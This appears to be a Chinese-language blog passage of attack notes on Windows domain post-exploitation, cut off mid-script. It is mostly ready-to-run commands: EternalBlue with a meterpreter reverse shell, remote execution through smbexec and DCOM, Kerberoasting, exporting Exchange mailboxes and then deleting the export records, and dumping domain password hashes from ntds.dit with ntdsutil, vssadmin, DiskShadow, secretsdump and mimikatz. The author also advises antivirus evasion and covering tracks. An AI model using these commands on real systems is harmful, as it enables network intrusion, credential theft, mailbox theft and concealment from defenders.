<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">metasploit:</span></span><br><span class="line"><span class="function">漏洞检测：</span></span><br><span class="line"><span class="function"><span class="title">use</span> <span class="title">auxiliary</span>/<span class="title">scanner</span>/<span class="title">smb</span>/<span class="title">smb_ms17_010</span></span></span><br><span class="line"><span class="function"><span class="title">set</span> <span class="title">RHOSTS</span> 192.168.1.1</span></span><br><span class="line"><span class="function"><span class="title">exploit</span></span></span><br><span class="line"><span class="function">漏洞利用：</span></span><br><span class="line"><span class="function"><span class="title">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">smb</span>/<span class="title">ms17_010_eternalblue</span></span></span><br><span class="line"><span class="function"><span class="title">set</span> <span class="title">RHOSTS</span> 192.168.1.1</span></span><br><span class="line"><span class="function"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">x64</span>/<span class="title">meterpreter</span>/<span class="title">reverse_tcp</span></span></span><br><span class="line"><span class="function"><span class="title">exploit</span></span></span><br></pre></td></tr></table></figure>

<h2 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h2><p>smbexec可以通过文件共享（admin$,c$,ipc$,d$）在远程系统中执行命令。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">原版安装：</span><br><span class="line">git clone https://github.com/brav0hax/smbexec.git</span><br><span class="line">chmod +x install.sh $$ ./install.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">C++版smbexec </span><br><span class="line">下载地址：https://github.com/sunorr/smbexec</span><br><span class="line">test.exe为客户端主程序</span><br><span class="line">execserver.exe为在目标服务器上的辅助程序,需要做好免杀</span><br><span class="line"></span><br><span class="line">与目标主机建立ipc连接后：</span><br><span class="line"><span class="built_in">copy</span> execserver.exe \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>.\c$\windwos\     将程序复制到目标服务器c盘的windows目录下。</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\ipc$ /<span class="built_in">del</span>   删除与<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>的ipc连接</span><br><span class="line">test.exe <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> administrator password whoami c$</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">impacket工具包中的smbexec.py</span><br><span class="line">smbexec.py test/administrator:password@<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="DCOM（分布式组件对象模型）"><a href="#DCOM（分布式组件对象模型）" class="headerlink" title="DCOM（分布式组件对象模型）"></a>DCOM（分布式组件对象模型）</h2><p>DCOM是微软的一系列概念和程序接口。通过DCOM，客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">Get-CimInstance默认只在powershell3.<span class="number">0</span>以上版本才存在，所以需要Windows server <span class="number">2012</span>及以上版本</span><br><span class="line">Get-CimInstance Win32_DCOMApplication  获取DCOM程序列表</span><br><span class="line">win7，windows server <span class="number">2008</span>中默认安装powershell2.<span class="number">0</span>,所以可以用以下命令代替：</span><br><span class="line">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication    获取DCOM程序列表</span><br><span class="line"></span><br><span class="line">启动远程主机的calc</span><br><span class="line">方法①</span><br><span class="line">$com = [activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(&quot;MMC2.<span class="number">0</span>.Application&quot;,&quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#x27;<span class="built_in">cmd</span>.exe&#x27;,$null,&quot;/c calc.exe&quot;,&quot;Minimzed&quot;)</span><br><span class="line">方法②</span><br><span class="line">$com = [<span class="built_in">Type</span>]::GetTypeFromCLSID(&#x27;<span class="number">9</span>BA05972-F6A8-<span class="number">11</span>CF-A442-<span class="number">00</span>A0C90A8F39&#x27;,&quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>&quot;)</span><br><span class="line">$obj = [System.Activator]::CreateInstance($com)</span><br><span class="line">$item = $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;<span class="built_in">cmd</span>.exe&quot;,&quot;/c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="SPN在域环境的应用"><a href="#SPN在域环境的应用" class="headerlink" title="SPN在域环境的应用"></a>SPN在域环境的应用</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">在域内为了方便分类各种服务，于是给每种资源分配不同的服务主体名称（Service Principal Name）SPN</span><br><span class="line">在使用Kerberos协议进行身份验证的网络环境下，必须在内置账号（NetworkService,LocalSystem）或者用户账号下为服务器注册SPN。对于内置账号，SPN将自动注册，但是在域用户账号下运行，则必须手动注册SPN。所以攻击者可以向域控发送查询请求，获取其需要的服务SPN，从而知晓其使用的服务资源在哪台机器上。</span><br><span class="line">以MSSQL为例：</span><br><span class="line">当用户需要访问MSSQL服务，系统会以当前用户身份向域控查询SPN为MSSQL的记录。找到SPN记录后，用户再次与密钥分发中心KDC通信，将KDC发放的票据TGT作为身份凭据发送给KDC，并将需要访问的SPN发送给KDC。KDC中的身份验证服务AS对TGT进行解密，确认无误后，由TGS将一张允许访问该SPN所对应的服务的票据和该SPN所对应的服务地址发送给用户。用户使用该票据即可访问该MSSQL服务。</span><br><span class="line"></span><br><span class="line">常见的SPN服务：</span><br><span class="line">MSSQLSvc/computer1.test.com:<span class="number">1433</span></span><br><span class="line">MSSQLSvc为服务组件的名称</span><br><span class="line">computer1是主机名</span><br><span class="line">test.com是域名</span><br><span class="line"><span class="number">1433</span>是端口  端口是可选参数</span><br><span class="line"></span><br><span class="line">exchange服务</span><br><span class="line">exchangeMDB/EXCAS01.test.com</span><br><span class="line">RDP服务</span><br><span class="line">TERMSERV/EXCAS01.test.com</span><br><span class="line">WSMan/WinRM/PSRemoting服务</span><br><span class="line">WSMAN/EXCAS01.test.com</span><br><span class="line"></span><br><span class="line">SPN扫描时，只需全请求特定SPN类型的服务主体名称来查找服务，可以无需添加端口，也就不会触发内网IPS等设备的扫描警告了。</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PowerShell-AD-Recon提供了一系列服务于服务登陆账号和运行服务的主机等之间的对应关系。</span><br><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">PyroTek3</span>/<span class="title">PowerShell</span>-<span class="title">AD</span>-<span class="title">Recon</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SPN</span>扫描<span class="title">MSSQL</span></span></span><br><span class="line"><span class="function">需要普通域用户权限。</span></span><br><span class="line"><span class="function"><span class="title">Import</span>-<span class="title">Module</span> .\<span class="title">Discover</span>-<span class="title">PSMSSQLServers.ps1</span></span></span><br><span class="line"><span class="function"><span class="title">Discover</span>-<span class="title">PSMSSQLServers</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SPN</span>扫描所有信息</span></span><br><span class="line"><span class="function"><span class="title">Import</span>-<span class="title">Module</span> .\<span class="title">Discover</span>-<span class="title">PSInterestingServices.ps1</span></span></span><br><span class="line"><span class="function"><span class="title">Discover</span>-<span class="title">PSInterestingServices.ps1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">使用<span class="title">windows</span>自带命令也可显示域内所有<span class="title">SPN</span>信息</span></span><br><span class="line"><span class="function"><span class="title">setspn</span> -<span class="title">T</span> <span class="title">domain</span> -<span class="title">q</span> */*</span></span><br><span class="line"><span class="function">查看指定用户注册的<span class="title">SPN</span></span></span><br><span class="line"><span class="function"><span class="title">setspn</span> -<span class="title">L</span> <span class="title">test.com</span>\<span class="title">mssql</span></span></span><br><span class="line"><span class="function">手动注册<span class="title">SPN</span></span></span><br><span class="line"><span class="function"><span class="title">setspn</span> -<span class="title">A</span> <span class="title">MSSQLSvc</span>/<span class="title">computer1.test.com</span>:1433 <span class="title">mssql</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">adsiedit.msc</span>可查看用户<span class="title">SPN</span>及其高级属性</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">请求<span class="title">SPN</span> <span class="title">Kerberos</span>票据</span></span><br><span class="line"><span class="function"><span class="title">Add</span>-<span class="title">Type</span> -<span class="title">AssemblyName</span> <span class="title">System.IdentityModel</span></span></span><br><span class="line"><span class="function"><span class="title">New</span>-<span class="title">Object</span> <span class="title">System.IdentityModel.Tokens.KerberosRequestor</span> <span class="title">SecurityToken</span> -<span class="title">ArgumentList</span> &quot;<span class="title">MSSQLSvc</span>/<span class="title">computer1.test.com</span>&quot;</span></span><br><span class="line"><span class="function">用<span class="title">mimikatz</span>导出票据</span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> &quot;<span class="title">kerberos</span>::<span class="title">list</span> /<span class="title">export</span>&quot;</span></span><br><span class="line"><span class="function">使用<span class="title">Kerberoast</span>工具破解密码 <span class="title">https</span>://<span class="title">github.com</span>/<span class="title">nidem</span>/<span class="title">kerberoast</span></span></span><br><span class="line"><span class="function"><span class="title">python</span> <span class="title">tgsrepcrack.py</span> <span class="title">wordlist.txt</span> <span class="title">mssql.kirbi</span></span></span><br><span class="line"><span class="function">需要密码加密方式为<span class="title">RC4_HMAC_MD5</span>（可在域内修改）。暴力破解感觉难度较大，用处不大。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Kerberos</span>票据请求的日志<span class="title">id</span>为4769</span></span><br></pre></td></tr></table></figure>

<h2 id="Exchange渗透"><a href="#Exchange渗透" class="headerlink" title="Exchange渗透"></a>Exchange渗透</h2><p>邮件服务器角色：</p>
<p>邮箱服务器、客户端访问服务器、集线传输服务器、统一消息服务器和边缘传输服务器。</p>
<p>客户端访问接口和协议：</p>
<p>OWA(用户邮箱)  ECP(管理中心) EWS</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">判断Exchange服务器:</span><br><span class="line"><span class="number">25</span>端口，smtp指纹为：Exchange smtpd</span><br><span class="line"><span class="number">80</span>端口为IIS <span class="number">8</span>.<span class="number">5</span></span><br><span class="line"><span class="number">443</span>端口跳转到exchange相关服务页面</span><br><span class="line"></span><br><span class="line">查看Mailbox数据库：</span><br><span class="line">Get-MailboxDatabase -server &quot;Exchange&quot;</span><br><span class="line">add-pssnapin microsoft.exchange*   //name列为其id</span><br><span class="line"></span><br><span class="line">查看数据库位置：</span><br><span class="line">get-mailboxstatistics -identity &#x27;其数据库id&#x27; | <span class="built_in">Format</span>-List Name,EdbFilePath,LogFolderpath</span><br><span class="line"></span><br><span class="line">查看全部用户邮箱使用信息。</span><br><span class="line">Get-Mailbox | <span class="built_in">Format</span>-Table Name,WindowsEmailAddress</span><br><span class="line"></span><br><span class="line">查看指定用户邮箱使用信息：</span><br><span class="line">get-mailboxstatistics -identity administrator | Select DispalyName,ItemCount,TotalItemSize,LastLogonTime</span><br><span class="line"></span><br><span class="line">查看全部用户邮箱使用信息</span><br><span class="line">Get-Mailbox -ResultSize Unlimited | Get-MailboxStatistics | <span class="built_in">Sort</span>-Object TotalItemSize -Descend</span><br><span class="line"></span><br><span class="line">查看哪些用户角色有导出权限</span><br><span class="line">Get-ManagementRoleAssignment -role &quot;Mailbox Import Export&quot; | <span class="built_in">Format</span>-List RoleAssigneeName</span><br><span class="line"></span><br><span class="line">给administrator用户添加到Mailbox Import Export组中，其就可以导出用户邮件了。</span><br><span class="line">New-ManagementRoleAssignment -Name &quot;Import Export_Domain Admins&quot; -User &quot;Administrator&quot; -Role &quot;Mailbox Import Export&quot;</span><br><span class="line"></span><br><span class="line">导出完成后，在Mailbox Import Export组中删除该用户。</span><br><span class="line">Remove-ManagementRoleAssignment &quot;Import Export_Domain Admins&quot; -Confirm:$false</span><br><span class="line"></span><br><span class="line">在导出邮件时，必须将文件放置在UNC（Universal Naming Convention，通用命名规则。如：&quot;\\ipaddress\sharename&quot;）</span><br><span class="line">开启共享文件夹：(设置为任何人都可以操作c盘的inetpub文件夹)</span><br><span class="line"><span class="built_in">net</span> share inetpub=c:\inetpub /grant:everyone,full</span><br><span class="line"><span class="built_in">net</span> share 即可查看开启的共享文件夹</span><br><span class="line"></span><br><span class="line">使用powershell导出用户administrator的邮件(如何批量导出用户邮件)</span><br><span class="line">New-MailboxExportRequest -Mailbox administrator -FilePath \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\inetpub\administrator.pst</span><br><span class="line"></span><br><span class="line">使用ecp管理中心导出邮件</span><br><span class="line">在收件人中点击...按钮，点击导出到PST文件，点击浏览按钮，选择指定用户，点击下一步，设置导出路径即可导出（路径也需要为UNC，如\\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>\inetpub\administrator.pst）</span><br><span class="line"></span><br><span class="line">无论是那种导出方式都会在Exchange服务器中留下相关信息。需要删除。</span><br><span class="line">查看所有的导出请求：</span><br><span class="line">Get-MailboxExportRequest</span><br><span class="line"></span><br><span class="line">删除指定用户的已完成导出请求：</span><br><span class="line">Remove-MailboxExportRequest -Identity  Administrator\mailboxexport</span><br><span class="line"></span><br><span class="line">删除所有已完成的导出请求：</span><br><span class="line">Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest</span><br></pre></td></tr></table></figure>

<h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><h2 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h2><p>ntds.dit默认在C:\Windows\NTDS下。但是被禁止复制，只能通过其他方式导出。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ntdsutil.exe是Active Directory提供管理设施的命令行工具。是windows自带的工具。支持Server2003、Server2008、Server2012</span><br><span class="line"></span><br><span class="line">创建快照：</span><br><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br><span class="line"></span><br><span class="line">挂载快照：</span><br><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</span><br><span class="line"></span><br><span class="line">拷贝快照：</span><br><span class="line"><span class="built_in">copy</span> C:\$SNAP_201808131112_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</span><br><span class="line"></span><br><span class="line">卸载并删除快照</span><br><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br><span class="line"></span><br><span class="line">查看快照：</span><br><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br><span class="line"></span><br><span class="line">将ntds.dit复制到c盘test目录下的Active Directory文件夹中，本导出SYSTEM和SECURITY文件到registry文件夹，可用于破解sam文件</span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">vssadmin是Server <span class="number">2008</span>及Windows <span class="number">7</span>系统提供的vss的管理工具。可用于创建或删除卷影副本，列出卷影副本信息，改变卷影副本存储看见的大小。</span><br><span class="line"></span><br><span class="line">创建快照：</span><br><span class="line">vssadmin create shadow /<span class="keyword">for</span>=c:</span><br><span class="line"></span><br><span class="line">复制快照：</span><br><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">删除快照：</span><br><span class="line">vssadmin delete shadows /<span class="keyword">for</span>=c: /quite</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">vssown.vbs其与vssadmin类似</span><br><span class="line"><span class="function">https://<span class="title">raw.githubusercontent.com</span>/<span class="title">borigue</span>/<span class="title">ptscripts</span>/<span class="title">master</span>/<span class="title">windows</span>/<span class="title">vssown.vbs</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">cscript</span> <span class="title">vssown.vbs</span> /<span class="title">start</span>        启动卷影复制服务</span></span><br><span class="line"><span class="function"><span class="title">cscript</span> <span class="title">vssown.vbs</span> /<span class="title">create</span> <span class="title">c</span>     创建一个<span class="title">C</span>盘卷影副本</span></span><br><span class="line"><span class="function"><span class="title">cscript</span> <span class="title">vssown.vbs</span> /<span class="title">list</span>         列出当前卷影副本</span></span><br><span class="line"><span class="function"><span class="title">cscript</span> <span class="title">vssown.vbs</span> /<span class="title">delete</span> &#123;<span class="title">GUID</span>&#125;      删除卷影副本</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">在powershell中使用nishang工具导出：</span><br><span class="line">import-Module .\<span class="built_in">Copy</span>-VSS.ps1</span><br><span class="line"><span class="built_in">copy</span>-vss</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">DiskShadow.exe是微软官方提供的软件，在Server2008、Server2012和Server2016默认包含了该软件。其可用于卷影拷贝服务（VSS）所提供的多个功能。也可用于ntds.dit的导出。功能上类似vshadow，但是vshadow是被包含在windowsSDK中，可能需要上传到目标机器上，而DiskShadow就存放在c:\windows\system32\中。</span><br><span class="line">DiskShadow有交互式和非交互式两种工作模式。交互式需要登陆远程桌面进行图形化管理。</span><br><span class="line"></span><br><span class="line">使用DiskShadow执行命令</span><br><span class="line">创建<span class="built_in">cmd</span>.txt文件</span><br><span class="line"><span class="built_in">echo</span> exec c:\windows\system32\calc.exe &gt; c:\<span class="built_in">cmd</span>.txt</span><br><span class="line">使用DiskShadow执行该文件</span><br><span class="line">DiskShadow /s c:\<span class="built_in">cmd</span>.txt</span><br><span class="line"></span><br><span class="line">创建一个txt文件，内容如下：</span><br><span class="line"><span class="built_in">set</span> context persistent nowriters</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">create</span><br><span class="line">expose <span class="variable">%someAlias%</span> k:</span><br><span class="line">exec &quot;<span class="built_in">cmd</span>.exe&quot; /c <span class="built_in">copy</span> k:\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line">delete shadows all</span><br><span class="line">list shadows all</span><br><span class="line">reset</span><br><span class="line"><span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">使用DiskShadow执行该文件（最好在system32的<span class="built_in">cmd</span>下执行，否则可能报错）</span><br><span class="line">DiskShadow /s c:\<span class="built_in">cmd</span>.txt</span><br><span class="line"></span><br><span class="line">注释</span><br><span class="line"><span class="built_in">set</span> context persistent nowriters    //设置卷影副本</span><br><span class="line">add volume c: alias someAlias    //添加新的卷</span><br><span class="line">create                          //创建新的快照</span><br><span class="line">expose <span class="variable">%someAlias%</span> k:           //分配虚拟盘符</span><br><span class="line">exec &quot;<span class="built_in">cmd</span>.exe&quot; /c <span class="built_in">copy</span> k:\windows\NTDS\ntds.dit c:\ntds.dit        //复制ntds.dit</span><br><span class="line">delete shadows all           //删除所有快照</span><br><span class="line">list shadows all             //列出系统的卷影副本</span><br><span class="line">reset                      //重置</span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">使用msf导出</span><br><span class="line">相关模块：</span><br><span class="line">post/windows/gather/ntds_location  查看ntds路径</span><br><span class="line">post/windows/gather/smart_hashdump  在线导出域账户hash（建议在<span class="number">2012</span>以上使用）</span><br><span class="line">post/windows/gather/hashdump  使用本地管理员导出域账户hash，没在线导出的全</span><br><span class="line">auxiliary/admin/smb/psexec_ntdsgrab 利用smb和域管理员账户 导出ntds到本地</span><br><span class="line">post/windows/gather/ntds_grabber  利用powershell将ntds压缩后下载到本地 </span><br><span class="line">post/windwos/gather/credentials/domain_hashdump </span><br></pre></td></tr></table></figure>



<p>导出ntds.dit后，可以将system.hive转储，因为system.hive中存放着ntds.dit的密钥，否则无法查看ntds.dit中的信息。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">reg save hklm\system c:\windows\temp\system.hive</span><br></pre></td></tr></table></figure>



<h2 id="导出ntds-dit中的hash"><a href="#导出ntds-dit中的hash" class="headerlink" title="导出ntds.dit中的hash"></a>导出ntds.dit中的hash</h2><p>获取域内详细信息可使用adfind，见<strong>十二、域林-1、获取域信息</strong></p>
<p>使用libesedb从ntds.dit中提取表文件。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">wget https://github.com/libyal/libesedb/releases/download/<span class="number">20170121</span>/libesedb-experimental-<span class="number">20170121</span>.tar.gz</span><br><span class="line">apt-get install autoconf automake autopoint libtool pkg-config</span><br><span class="line">tar -zxvf libesedb-experimental-<span class="number">20170121</span>.tar.gz</span><br><span class="line"></span><br><span class="line">编译安装：</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line">安装完成后会在/usr/local/bin目录下产生esedbexport程序</span><br><span class="line"></span><br><span class="line">esedbexport -m tables ntds.dit</span><br><span class="line">导出的文件在ntds.dit.export文件夹中</span><br></pre></td></tr></table></figure>

<p><strong>NTDSDumpEx导出hash</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">下载地址：https://github.com/zcgonvh/NTDSDumpEx/releases</span><br><span class="line">NTDSDumpEx -d ntds.dit -s system -o domain.txt</span><br></pre></td></tr></table></figure>

<p>使用NTDSDump导出hash </p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ntdsdump.exe -f ntds.dit -s SYSTEM -o out.txt -h</span><br><span class="line">ntdsdump.exe &lt;-f ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv&gt; [-o out.txt] [-h] [-t JOHN|LC]</span><br><span class="line">-f    ntds.dit路径</span><br><span class="line">-k   可选的十六进制格式的SYSKEY</span><br><span class="line">-s    可选的system.hiv路径</span><br><span class="line">-h   导出历史密码记录</span><br><span class="line">-t    导出格式，LC或JOHN</span><br><span class="line">-o   导出到指定文件中</span><br><span class="line"></span><br><span class="line">        JetAttachDatabase() failed</span><br><span class="line">原因：数据库需要修复，执行esentutl /p /o ntds.dit进行修复。</span><br></pre></td></tr></table></figure>

<p><strong>使用ntdsxtract导出hash以及域内机器信息</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">安装：</span><br><span class="line">git clone https://github.com/csababarta/ntdsxtract.git</span><br><span class="line">python setup.py build &amp;&amp; python setup.py install</span><br><span class="line"></span><br><span class="line">将导出的ntds.dit.export文件夹和SYSTEM文件一并放入ntdsxtract文件夹</span><br><span class="line">SYSTEM路径：C:\Windows\System32\config\SYSTEM</span><br><span class="line"></span><br><span class="line">导出所有用户的hash到all_user.txt  (output目录下ntout.txt也有）</span><br><span class="line">python2 dsusers.py ntds.dit.export/datatable.<span class="number">3</span> ntds.dit.export/link_table.<span class="number">5</span> output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee all_user.txt</span><br><span class="line"></span><br><span class="line">导出域内所有计算机信息  computer_output文件夹内</span><br><span class="line">python2 dscomputers.py ntds.dit.export/datatable.<span class="number">3</span> computer_output --csvoutfile all_computers.csv</span><br></pre></td></tr></table></figure>

<p>使用impacket导出hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">安装：</span><br><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">python setup.py install</span><br><span class="line"></span><br><span class="line">导出：</span><br><span class="line">impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL</span><br><span class="line"></span><br><span class="line">远程导出域控上的ntds.dit中的hash</span><br><span class="line">impacket-secretsdump -hashes xxxxx -just-dc test.com/administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br><span class="line">xxx为域用户hash</span><br><span class="line">administrator为域用户名</span><br><span class="line">test.com为域</span><br><span class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>为域控ip</span><br></pre></td></tr></table></figure>

<p>使用Dcsync获取用户hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz具有dcsync功能，可以利用卷影拷贝服务直接读取ntds.dit文件并检索域hash。但是mimikatz必须使用域管理员用户权限才可。</span><br><span class="line"></span><br><span class="line">在域内任意一台计算机上，以域管理员权限运行minikatz</span><br><span class="line">导出域内所有用户名和hash</span><br><span class="line"><span class="function">lsadump::<span class="title">dcsync</span> /<span class="title">domain:test</span>.<span class="title">com</span> /<span class="title">all</span> /<span class="title">csv</span></span></span><br><span class="line"><span class="function">导出指定用户<span class="title">rootadmin</span>的<span class="title">hash</span></span></span><br><span class="line"><span class="function"><span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:test</span>.<span class="title">com</span> /<span class="title">user:rootadmin</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">也可以直接在域控中使用<span class="title">mimikatz</span>转储<span class="title">lsass.exe</span>来对<span class="title">hash</span>进行<span class="title">dump</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> &quot;<span class="title">privilege</span>::<span class="title">debug</span>&quot; &quot;<span class="title">lsadump</span>::<span class="title">lsa</span> /<span class="title">inject</span>&quot; &quot;<span class="title">exit</span>&quot; &gt; <span class="title">log.txt</span></span></span><br></pre></td></tr></table></figure>

<p>使用powershell脚本Invoke-DCSync.ps1导出hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">下载地址：https://gist.github.com/monoxgas/<span class="number">9</span>d238accd969550136db</span><br><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure>

<p>dcsync这种方式动静会小一点，优先考虑使用。</p>
<h2 id="使用vshadow和QuarksPwDump导出域账号和域hash"><a href="#使用vshadow和QuarksPwDump导出域账号和域hash" class="headerlink" title="使用vshadow和QuarksPwDump导出域账号和域hash"></a>使用vshadow和QuarksPwDump导出域账号和域hash</h2><p>在实际环境中ntds.dit和SYSTEM文件都较大，传输不太方便。当域控上没有杀软可尝试在域控上直接导出hash。</p>
<p>QuarksPwDump下载地址：<a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump">https://github.com/quarkslab/quarkspwdump</a></p>
<p>流程：</p>
<p>利用vshadow.exe复制ntds.dit。vshadow需要自己上传到服务器上，且需要对应的版本。可以安装windows SDK后，进行提取。<a target="_blank" rel="noopener" href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p>
<p>利用QuarksPwDump读取ntds.dit后导出域账户hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">vshadow.exe -q 创建快照</span><br><span class="line"><span class="built_in">copy</span> \\?\GLOBALROOT\Device\HarddiskVoluumeShadowCopyX\windows\NTDS\ntds.dit c:\windows\temp\    复制出ntds.dit</span><br><span class="line">vshadow.exe -dx=&#123;快照ID&#125;  删除指定的快照   vshadow.exe -da  删除所有快照</span><br></pre></td></tr></table></figure>

<p>可以直接使用以下bat脚本实现ntds.dit的导出和system的导出，以及快照的删除等。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setlocal</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">NOT</span> &quot;<span class="variable">%CALLBACK_SCRIPT%</span>&quot;==&quot;&quot; <span class="keyword">goto</span> :IS_CALLBACK</span><br><span class="line"><span class="built_in">set</span> SOURCE_DRIVE_LETTER=<span class="variable">%SystemDrive%</span></span><br><span class="line"><span class="built_in">set</span> SOURCE_RELATIVE_PATH=windows\ntds\ntds.dit</span><br><span class="line"><span class="built_in">set</span> DESTINATION_PATH=%~dp0</span><br><span class="line">@<span class="built_in">echo</span> ...Determine the scripts to be executed/generated...</span><br><span class="line"><span class="built_in">set</span> CALLBACK_SCRIPT=%~dpnx0</span><br><span class="line"><span class="built_in">set</span> TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.<span class="built_in">cmd</span></span><br><span class="line">@<span class="built_in">echo</span> ...Creating the shadow <span class="built_in">copy</span>...</span><br><span class="line">&quot;%~dp0vshadow.exe&quot; -script=<span class="variable">%TEMP_GENERATED_SCRIPT%</span> -exec=&quot;<span class="variable">%CALLBACK_SCRIPT%</span>&quot; <span class="variable">%SOURCE_DRIVE_LETTER%</span></span><br><span class="line"><span class="built_in">del</span> /f <span class="variable">%TEMP_GENERATED_SCRIPT%</span></span><br><span class="line">@<span class="keyword">goto</span> :EOF</span><br><span class="line">:IS_CALLBACK</span><br><span class="line"><span class="built_in">setlocal</span></span><br><span class="line">@<span class="built_in">echo</span> ...Obtaining the shadow <span class="built_in">copy</span> device name...</span><br><span class="line"><span class="keyword">call</span> <span class="variable">%TEMP_GENERATED_SCRIPT%</span></span><br><span class="line">@<span class="built_in">echo</span> ...Copying from the shadow <span class="built_in">copy</span> to the destination <span class="built_in">path</span>...</span><br><span class="line"><span class="built_in">copy</span> &quot;<span 